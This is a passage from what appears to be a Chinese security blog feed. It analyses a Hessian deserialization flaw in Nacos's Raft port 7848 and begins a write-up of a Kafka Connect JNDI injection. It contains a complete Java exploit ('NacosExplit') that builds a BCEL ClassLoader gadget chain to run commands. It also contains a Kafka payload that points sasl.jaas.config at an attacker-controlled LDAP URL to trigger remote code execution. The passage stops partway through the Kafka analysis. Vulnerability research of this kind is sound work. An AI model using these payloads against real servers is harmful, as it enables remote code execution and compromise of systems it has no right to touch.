class="hljs-keyword">new</span> <span class="hljs-title class_">Status</span>(RaftError.ESTATEMACHINE, <span class="hljs-string">&quot;StateMachine meet critical error: %s.&quot;</span>,<br>                            ExceptionUtil.getStackTrace(t)));<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br><span class="hljs-comment">//此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br><span class="hljs-comment">//此处接收类为 InstanceStoreRequest，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br><span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">InstanceStoreRequest</span> <span class="hljs-variable">instanceRequest</span> <span class="hljs-operator">=</span> serializer.deserialize(request.getData().toByteArray());<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">DataOperation</span> <span class="hljs-variable">operation</span> <span class="hljs-operator">=</span> DataOperation.valueOf(request.getOperation());<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> readLock;<br>    lock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">switch</span> (operation) &#123;<br>            <span class="hljs-keyword">case</span> ADD:<br>                onInstanceRegister(instanceRequest.service, instanceRequest.instance,<br>                        instanceRequest.getClientId());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DELETE:<br>                onInstanceDeregister(instanceRequest.service, instanceRequest.getClientId());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> CHANGE:<br>                <span class="hljs-keyword">if</span> (instanceAndServiceExist(instanceRequest)) &#123;<br>                    onInstanceRegister(instanceRequest.service, instanceRequest.instance,<br>                            instanceRequest.getClientId());<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(<span class="hljs-string">&quot;unsupport operation : &quot;</span> + operation)<br>                        .build();<br>        &#125;<br>    &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        lock.unlock();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//public static final NAMING_PERSISTENT_SERVICE_GROUP_V2 = &quot;naming_persistent_service_v2&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//NAMING_PERSISTENT_SERVICE_GROUP_V2 = &quot;naming_persistent_service_v2&quot;;</span><br>    <span class="hljs-keyword">return</span> Constants.NAMING_PERSISTENT_SERVICE_GROUP_V2;<br>&#125;<br></code></pre></td></tr></table></figure><p> com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br><span class="hljs-comment">////此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br><span class="hljs-comment">//此处接收类为 MetadataOperation&lt;InstanceMetadata&gt;，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br><span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    MetadataOperation&lt;InstanceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);<br>    readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>    ....<br>        &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        Loggers.RAFT.error(<span class="hljs-string">&quot;onApply &#123;&#125; instance metadata operation failed. &quot;</span>, request.getOperation(), e);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> == e.getMessage() ? e.getClass().getName() : e.getMessage();<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(errorMessage).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        readLock.unlock();<br>    &#125;<br>&#125;<br>    <br><span class="hljs-comment">//    public static final String INSTANCE_METADATA = &quot;naming_instance_metadata&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Constants.SERVICE_METADATA;<br>&#125;<br></code></pre></td></tr></table></figure><p> com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApply()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br><span class="hljs-comment">//此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br><span class="hljs-comment">//此处接收类为 MetadataOperation&lt;ServiceMetadata&gt;，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br><span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    MetadataOperation&lt;ServiceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);<br>    readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>    ...<br>        &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        Loggers.RAFT.error(<span class="hljs-string">&quot;onApply &#123;&#125; service metadata operation failed. &quot;</span>, request.getOperation(), e);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> == e.getMessage() ? e.getClass().getName() : e.getMessage();<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(errorMessage).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        readLock.unlock();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//    public static final String SERVICE_METADATA = &quot;naming_service_metadata&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Constants.INSTANCE_METADATA;<br>&#125;<br></code></pre></td></tr></table></figure><p>MetadataOperation 存在属性 metadata  为泛型，可以构造一个 MetadataOperation 对象，并在其 metadata 属性设置恶意对象，此时反序列化后的对象符合预期，不会报错，服务继续运行，可多次攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetadataOperation</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">111405695252896706L</span>;<br><br>    <span class="hljs-keyword">private</span> String namespace;<br><br>    <span class="hljs-keyword">private</span> String group;<br><br>    <span class="hljs-keyword">private</span> String serviceName;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * If the metadata is cluster or instance, the tag should be added with the identity of cluster or instance.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String tag;<br><br>    <span class="hljs-keyword">private</span> T metadata;<br><br>...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h3><ol><li>攻击端口默认为7848</li><li>为Hessian 反序列化链攻击</li><li>存在三个攻击链</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">naming_persistent_service_v2  ----  PersistentClientOperationServiceImpl<br>naming_instance_metadata  ----  InstanceMetadataProcessor  <br>naming_service_metadata  ----   ServiceMetadataProcessor    <br></code></pre></td></tr></table></figure><ol start="4"><li>PersistentClientOperationServiceImpl  要求反序列化类为 InstanceStoreRequest</li><li>InstanceMetadataProcessor 要求反序列化类为 MetadataOperation<InstanceMetadata></li><li>ServiceMetadataProcessor 要求反序列化类为 MetadataOperation<ServiceMetadata></li><li>MetadataOperation 存在泛型属性 metadata，可设置其为恶意对象进行攻击，不影响服务运行，可多次攻击</li></ol><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>此漏洞利用为Hessian 反序列化，可使用多个Hessian 反序列化 Gadget ，以下payload使用 BCEL ClassLoader Gadget。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadata;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadata;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.RpcClient;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.util.Endpoint;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.google.protobuf.ByteString;<br><span class="hljs-keyword">import</span> com.google.protobuf.Message;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosExplit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">CliClientServiceImpl</span> <span class="hljs-variable">cliClientService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliClientServiceImpl</span>();<br>        cliClientService.init(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CliOptions</span>());<br>        setProperties(cliClientService.getRpcClient());<br><br>        MetadataOperation&lt;ServiceMetadata&gt; metadataOperation = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MetadataOperation</span>&lt;ServiceMetadata&gt;();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">metadataField</span> <span class="hljs-operator">=</span> metadataOperation.getClass().getDeclaredField(<span class="hljs-string">&quot;metadata&quot;</span>);<br>        metadataField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//此处BCEL_ClassLoader() 可更换为其他 Gadget</span><br>        metadataField.set(metadataOperation,BCEL_ClassLoader());<br>        WriteRequest.<span class="hljs-type">Builder</span> <span class="hljs-variable">writeRequestBuilder</span> <span class="hljs-operator">=</span> WriteRequest.newBuilder().setGroup(<span class="hljs-string">&quot;naming_service_metadata&quot;</span>).setData(serialize(metadataOperation));<br><br>        <span class="hljs-comment">//二选一均可以攻击</span><br><span class="hljs-comment">//        MetadataOperation&lt;InstanceMetadata&gt; metadataOperation = new MetadataOperation&lt;InstanceMetadata&gt;();</span><br><span class="hljs-comment">//        Field metadataField = metadataOperation.getClass().getDeclaredField(&quot;metadata&quot;);</span><br><span class="hljs-comment">//        metadataField.setAccessible(true);</span><br><span class="hljs-comment">//        metadataField.set(metadataOperation,BCEL_ClassLoader());</span><br><span class="hljs-comment">//        WriteRequest.Builder writeRequestBuilder = WriteRequest.newBuilder().setGroup(&quot;naming_instance_metadata&quot;).setData(serialize(metadataOperation));</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cliClientService.getRpcClient().invokeSync(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Endpoint</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">7848</span>), writeRequestBuilder.build(), <span class="hljs-number">10000</span>);<br>        System.out.println(o);<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(RpcClient rpcClient)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">parserClasses</span> <span class="hljs-operator">=</span> rpcClient.getClass().getDeclaredField(<span class="hljs-string">&quot;parserClasses&quot;</span>);<br>        parserClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        Map&lt;String, Message&gt; map = (Map&lt;String, Message&gt;) parserClasses.get(rpcClient);<br>        map.put(<span class="hljs-string">&quot;com.alibaba.nacos.consistency.entity.WriteRequest&quot;</span>, WriteRequest.getDefaultInstance());<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">messages</span> <span class="hljs-operator">=</span> MarshallerHelper.class.getDeclaredField(<span class="hljs-string">&quot;messages&quot;</span>);<br>        messages.setAccessible(<span class="hljs-literal">true</span>);<br>        Map&lt;String, Message&gt; messageMap = (Map&lt;String, Message&gt;) messages.get(MarshallerHelper.class);<br>        messageMap.put(<span class="hljs-string">&quot;com.alibaba.nacos.consistency.entity.WriteRequest&quot;</span>, WriteRequest.getDefaultInstance());<br>&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ByteString <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(o);<br>        out.close();<br><br>        <span class="hljs-keyword">return</span> ByteString.copyFrom(bos.toByteArray());<br>    &#125;<br><br>    <span class="hljs-comment">//BCEL ClassLoader Gadget</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">BCEL_ClassLoader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + Utility.encode(clazz.getBytes(), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>,<span class="hljs-string">&quot;_main&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;payload&#125;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        u1.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        u2.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(u1,u1);<br>        map.put(u2,u2);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Evil</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kafka命令执行漏洞一</title>
    <link href="/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%80/"/>
    <url>/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、kafka"><a href="#一、kafka" class="headerlink" title="一、kafka"></a>一、kafka</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Kafka是最初由Linkedin公司开发，是一个分布式、支持分区的（partition）、多副本的（replica），基于zookeeper协调的分布式消息系统，它的最大的特性就是可以实时的处理大量数据以满足各种需求场景：比如基于hadoop的批处理系统、低延迟的实时系统、storm&#x2F;Spark流式处理引擎，web&#x2F;nginx日志、访问日志，消息服务等等，用scala语言编写，Linkedin于2010年贡献给了Apache基金会并成为顶级开源项目。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。</p><p>此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应，攻击者可以使用它在 Kafka 连接服务器上执行 java 反序列化小工具链。当类路径中有小工具时，攻击者可以造成不可信数据的无限制反序列化（或）RCE 漏洞。</p><p>此漏洞利用的前提是：需要访问 Kafka Connect worker，并能够使用任意 Kafka 客户端 SASL JAAS 配置和基于 SASL 的安全协议在其上创建&#x2F;修改连接器。 自 Apache Kafka 2.3.0 以来，这在 Kafka Connect 集群上是可能的。 通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何 Kafka 客户端的 <code>sasl.jaas.config</code> 属性设置为“com.sun.security.auth.module.JndiLoginModule”，它可以是通过“producer.override.sasl.jaas.config”,“consumer.override.sasl.jaas.config”或“admin.override.sasl.jaas.config”属性完成。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Kafka 2.3.0 - 3.3.2</p><h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.kafka<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kafka-clients<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//高版本JDK(jdk8_191以上)需设置此才可通过ldap进行JNDI注入,低版本JDK不影响</span><br>    <span class="hljs-comment">//高版本科配合JNDI高版本绕过方式</span><br>    System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br><br>    <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    props.put(<span class="hljs-string">&quot;security.protocol&quot;</span>,<span class="hljs-string">&quot;SASL_SSL&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;sasl.jaas.config&quot;</span>,<span class="hljs-string">&quot;com.sun.security.auth.module.JndiLoginModule &quot;</span> +<br>            <span class="hljs-string">&quot;required user.provider.url=\&quot;ldap://192.168.0.104:1389/Basic/Command/calc\&quot; &quot;</span> +<br>            <span class="hljs-string">&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;</span> +<br>            <span class="hljs-string">&quot;group.provider.url=\&quot;xxx\&quot;;&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;bootstrap.servers&quot;</span>, <span class="hljs-string">&quot;localhost:9092&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;key.serializer&quot;</span>, <span class="hljs-string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);<br>    props.put(<span class="hljs-string">&quot;value.serializer&quot;</span>, <span class="hljs-string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);<br>    Producer&lt;String, String&gt; producer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaProducer</span>&lt;&gt;(props);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>调试跟进方法</p><p><img src="/image/kafkaimage-0.png" alt="img"></p><p>org.apache.kafka.clients.producer.KafkaProducer构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 